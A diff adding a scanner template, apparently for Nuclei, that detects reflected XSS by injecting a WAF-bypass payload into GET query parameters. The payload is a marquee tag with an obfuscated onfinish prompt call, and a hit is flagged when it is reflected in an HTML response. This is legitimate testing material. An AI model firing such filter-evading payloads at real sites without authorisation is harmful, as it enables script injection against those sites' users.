@@ -1,0 +1,39 @@
+id: fuzz-xss-waf-bypass
+
+info:
+  name: XSS WAF Bypass Detection
+  author: netbaan
+  severity: medium
+  description: |
+    This template checks for XSS vulnerabilities utilizing a WAF bypass payload with a marquee tag.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Only proceed with GET requests
+
+    payloads:
+      xss_payload:
+        - "Hh\\'><marquee loop=1 width=0 onfinish=pr\\u006fmpt`_Y000!_`>Y000</marquee>"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{xss_payload}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{xss_payload}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
